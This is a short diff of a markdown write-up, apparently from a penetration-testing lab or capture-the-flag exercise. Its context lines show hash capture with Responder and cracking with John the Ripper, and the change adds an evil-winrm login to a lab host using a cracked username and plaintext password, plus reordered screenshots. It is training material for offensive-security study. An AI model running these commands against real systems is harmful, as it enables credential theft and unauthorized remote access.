@@ -34,9 +34,11 @@ sudo responder -wd -I eth0
 ```
 john --wordlist=/home/kali/PAYLOADS/rockyou.txt hash_pass.txt
 ```
-![image](https://github.com/stensil4rt/CodeBy/assets/62753044/ced3007d-f8a7-4737-8bad-9dee47deb159)
-
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/e216110c-dd36-4911-826a-9bbb3a9e54b2)
+```
+evil-winrm -i 192.168.2.10 -u 'albert.morozov' -p 'MissDivaGirlno1'
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/ced3007d-f8a7-4737-8bad-9dee47deb159)
 
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/f16b6da8-76f4-4340-a34f-fa898db1179c)
 
